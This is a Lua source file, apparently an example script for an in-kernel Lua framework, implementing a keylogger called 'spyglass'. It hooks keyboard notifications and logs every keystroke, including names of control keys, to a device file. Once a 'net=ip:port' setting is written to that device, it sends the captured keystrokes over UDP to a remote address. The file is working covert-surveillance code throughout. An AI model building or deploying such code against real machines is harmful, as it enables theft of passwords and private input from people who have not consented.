--
-- SPDX-FileCopyrightText: (c) 2023-2024 Ring Zero Desenvolvimento de Software LTDA
-- SPDX-License-Identifier: MIT OR GPL-2.0-only
--

local notifier = require("notifier")
local device = require("device")
local inet = require("socket.inet")

local function info(...)
	print("spyglass: " .. string.format(...))
end

local control = {
	 [0] = "nul",  [1] = "soh",  [2] = "stx",  [3] = "etx",  [4] = "eot",  [5] = "enq",
	 [6] = "ack",  [7] = "bel",  [8] = "bs",   [9] = "ht",  [10] = "nl",  [11] = "vt",
	[12] = "np",  [13] = "cr",  [14] = "so",  [15] = "si",  [16] = "dle", [17] = "dc1",
	[18] = "dc2", [19] = "dc3", [20] = "dc4", [21] = "nak", [22] = "syn", [23] = "etb",
	[24] = "can", [25] = "em",  [26] = "sub", [27] = "esc", [28] = "fs",  [29] = "gs",
	[30] = "rs",  [31] = "us", [127] = "del"
}

local function printable(keysym)
	return keysym >= 32 and keysym <= 126
end

local spyglass = {name = "spyglass", log = ""}

function spyglass:read()
	local log = self.log
	self.log = ""
	local socket = self.socket
	if socket and #log > 0 then
		pcall(socket.send, socket, log, ip, port)
		return ""
	end
	return log
end

local settings = {
	['enable'] = function (self, enable)
		local enable = enable ~= "false"
		if enable and not self.notifier then
			self.notifier = notifier.keyboard(self.callback)
		elseif not enable and self.notifier then
			self.notifier:delete()
			self.notifier = nil
		end
	end,
	['net'] = function (self, net)
		local ip, port = string.match(net, "(%g+):(%d+)")
		if ip then
			info("enabling network support %s:%d", ip, port)
			self.socket = inet.udp()
			self.socket:connect(ip, port)
		elseif self.socket then
			info("disabling network support")
			self.socket:close()
			self.socket = nil
		end
	end
}

function spyglass:write(buf)
	for k, v in string.gmatch(buf, "(%w+)=(%g+)") do
		local setter = settings[k]
		if setter then
			setter(self, v)
		end
	end
end

local notify = notifier.notify
local kbd    = notifier.kbd
function spyglass.callback(event, down, shift, key)
	if not down and event == kbd.KEYSYM then
		local keysym = key & 0xFF
		local log = printable(keysym) and string.char(keysym) or
			string.format("<%s>", control[keysym])
		spyglass.log = spyglass.log .. log
	end
	return notify.OK
end

spyglass.notifier = notifier.keyboard(spyglass.callback)
spyglass.device = device.new(spyglass)

